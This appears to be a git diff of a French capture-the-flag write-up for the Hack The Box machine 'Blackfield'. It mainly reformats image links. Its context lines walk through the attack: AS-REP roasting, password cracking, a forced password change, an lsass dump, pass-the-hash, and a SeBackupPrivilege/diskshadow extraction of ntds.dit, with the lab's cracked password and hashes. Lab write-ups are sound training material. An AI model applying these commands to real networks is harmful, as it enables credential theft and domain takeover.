@@ -1,9 +1,6 @@
 # Infos
 
-Level : Hard
-OS : Windows 2016
-IP : 10.129.23.174
-Hostname : blackfield.local
+![](img/bf-card.png)
 
 # Recon
 
@@ -53,7 +50,7 @@ Enumération de tous les enregistrements DNS
 
 On retrouve le NS `dc01.blackfield.local` que l'on ajoute à /etc/hosts
 
-![[Hack The Box/blackfield/img/53-any.png]]
+![](img/53-any.png)
 
 Tentative de transfert de zone, mais ça ne donne rien.
 
@@ -71,13 +68,13 @@ Récupérer des informations avec ldapsearch.py, notamment la version du serveur
 
 `ldapsearch-ad.py --server "blackfield.local" --type info`
 
-![[389-ldap-info.png]]
+![](img/389-ldap-info.png)
 
 Si on tente une énumération LDAP null bind, ça ne donne rien
 
 `ldapsearch -H ldap://blackfield.local -x -b "DC=blackfield,DC=local"`
 
-![[389-ldap-error.png]]
+![](img/389-ldap-error.png)
 
 ## Port 445/tcp - SMB
 
@@ -89,7 +86,7 @@ En revanche, ça fonctionne avec un compte au hasard, par exemple `luks`
 
 `netexec smb blackfield.local -u 'luks' -p '' --shares`
 
-![[445-null-shares.png]]
+![](img/445-null-shares.png)
 
 On retrouve plusieurs partages inhabituels :
 - forensic
@@ -99,19 +96,19 @@ Si on consulte la [doc](https://www.netexec.wiki/smb-protocol/enumeration/enumer
 
 `netexec smb blackfield.local -u 'luks' -p '' --shares --filter-shares READ WRITE`
 
-![[445-null-shares-filter.png]]
+![](img/445-null-shares-filter.png)
 
 On peut énumérer `profiles$` et on retrouve plusieurs dossiers utilisateurs vides.
 
 `smbclient //10.129.23.174/profiles$`
 
-![[443-smb-profiles.png]]
+![](img/443-smb-profiles.png)
 
 Pour récupérer seulement les utilisateurs on peut utiliser awk
 
 `smbclient '//10.129.23.174/profiles$' -N -c ls | awk '{print $1}' > users.lst`
 
-![[445-users-list.png]]
+![](img/445-users-list.png)
 
 Maintenant qu'on dispose d'une liste d'utilisateurs valides, on peut tenter une attaque ASreproast pour voir si des utilisateurs ont la pré-auth kerberos de désactivé.
 
@@ -119,7 +116,7 @@ Maintenant qu'on dispose d'une liste d'utilisateurs valides, on peut tenter une 
 
 Ca fonctionne et on retrouve le hash du compte `blackfield.local\support`
 
-![[aspreproast-hash.png]]
+![](img/aspreproast-hash.png)
 
 On peut tenter de le cracker avec JtR et la wordlist rockyou
 
@@ -127,7 +124,7 @@ On peut tenter de le cracker avec JtR et la wordlist rockyou
 john --wordlist=`fzf-wordlists` ASREProastables.txt
 ```
 
-![[aspreproast-crack.png]]
+![](img/aspreproast-crack.png)
 
 Ca fonctionne et on retrouve le mdp `#00^BlackKnight`. On a pu voir lors du scan nmap TCP full que le port 5985/winrm était ouvert. On peut essayer de se connecter avec evil-winrm.
 
@@ -135,11 +132,11 @@ Ca fonctionne et on retrouve le mdp `#00^BlackKnight`. On a pu voir lors du scan
 
 Ca ne fonctionne pas
 
-![[5985-evilwrm-support.png]]
+![](img/5985-evilwrm-support.png)
 
 C'est parce qu'il ne fait pas parti du groupe `Remote Management Users`
 
-![[445-nxc-rmu.png]]
+![](img/445-nxc-rmu.png)
 
 Mais comme on dispose d'un compte, on peut utiliser bloodhound
 
@@ -151,34 +148,36 @@ bloodhound
 
 En mettant l'utilisateur `support` comme compromis et on regardant un peu les possibilités, si on clique sur `First Degree Object Control` dans la partie `Outbound object control`, on peut voir qu'il peut forcer le changement de mot de passe du compte `audit2020`.
 
-![[bh-forcechangepass-audit2020.png]]
+![](img/bh-forcechangepass-audit2020.png)
 
 On peut le faire en RPC
 
 `net rpc password 'audit2020' 'Pentest123!' -U blackfield.local/support%'#00^BlackKnight' -S blackfield.local`
 
-![[rpc-changepass.png]]
+![](img/rpc-changepass.png)
 
 ### Foothold - svc_backup
 
 Si on énumère les shares de notre nouvel utilisateur `audit2020`, on peut voir qu'il a accès en lecture au share `forensic`.
 
-![[audit-shares-forensic.png]]
+![](img/audit-shares-forensic.png)
 
 On se connecte au share et on retrouve trois dossiers :
 - commands_output -> sorties de commande classiques (utilisateurs du domaine, processus, systeminfo)
 - memory_analysis -> fichiers d'analyse mémoire (lsass, winlogin, etc)
 - tools -> outils tel que volatility, sysinternals etc.
 
-![[share-forensic-folders.png]]
+![](img/share-forensic-folders.png)
 
 Dans le répertoire `memory_analysis`, on retrouve un fichier `lsass.DMP`
 
-![[zip-lsass.png]]
+![](img/zip-lsass.png)
 
 Extraction du .zip et utilisation de pypykatz pour retrouver les secrets comme des hashs
 
 `pypykatz lsa minidump lsass.DMP`
+
+![](img/pypykatz-dump-lsass.png)
 
 On retrouve deux hashs
 
@@ -191,23 +190,23 @@ On peut utiliser evil-winrm pth pour se connecter au compte svc_backup
 
 `evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.129.23.174`
 
-![[usershell-svc_backup.png]]
+![](img/usershell-svc_backup.png)
 
 Récupération du premier flag
 
-![[userflag.png]]
+![](img/userflag.png)
 
 ### Elévation de privilèges - Administrator
 
 Si on tente la même chose avec le compte Administrator, ça ne fonctionne pas avec evil-winrm et psexec. En revanche, on a vu avec bloodhound que si on disposait d'un shell avec svc_backup sur dc01.blackfield.local, on pouvait DCSync.
 
-![[bh-dcsync.png]]
+![](img/bh-dcsync.png)
 
 Mais le DCSync ne fonctionne pas. L'utilisateur dispose des privilèges `SeBackupPrivilege`, ce qui veut dire que l'on peut récupérer la base SAM et SYSTEM et dump les hash localement
 
 On peut voir à la racine un fichier `notes.txt` qui nous explique que le flag root.txt a été chiffré
 
-![[notes-pe.png]]
+![](img/notes-pe.png)
 
 On peut utiliser cet [article](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) pour PE, notamment la partie `Exploiting Privilege on Domain Controller (Method 1)`
 
@@ -222,7 +221,7 @@ expose %luks% z:
 unix2dos luks.dsh
 ```
 
-![[pe-dsh-luks.png]]
+![](img/pe-dsh-luks.png)
 
 Créer un dossier dans C:\temp et upload le fichier, puis utiliser diskshadow pour créer une copie du disque C: en Z: et enfin utiliser robocopy du disque Z: vers le répertoire temp.
 
@@ -233,7 +232,7 @@ diskshadow /s luks.dsh
 robocopy /b z:\windows\ntds . ntds.dit
 ```
 
-![[robocopy.png]]
+![](img/robocopy.png)
 
 Maintenant que l'on récupéré la base ntds.dit, on peut récupérer la ruche SYSTEM
 
@@ -241,13 +240,13 @@ Maintenant que l'on récupéré la base ntds.dit, on peut récupérer la ruche S
 reg save hklm\system c:\temp\SYSTEM
 ```
 
-![[system_hive.png]]
+![](img/system_hive.png)
 
 On récupère le tout sur la machine d'attaque avec la commande `download`, enfin, on utilise secretsdump ou pypykatz pour récupérer les hashs
 
 `secretsdump.py -system SYSTEM LOCAL -ntds ntds.dit`
 
-![[secretsdump-extract-final.png]]
+![](img/secretsdump-extract-final.png)
 
 `Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::`
 
@@ -255,4 +254,4 @@ Connexion avec evil-winrm et récupération du dernier flag
 
 `evil-winrm -u Administrator -H 184fb5e5178480be64824d4cd53b99ee -i 10.129.23.174`
 
-![[evil-wrm-admin.png]]
+![](img/evil-wrm-admin.png)
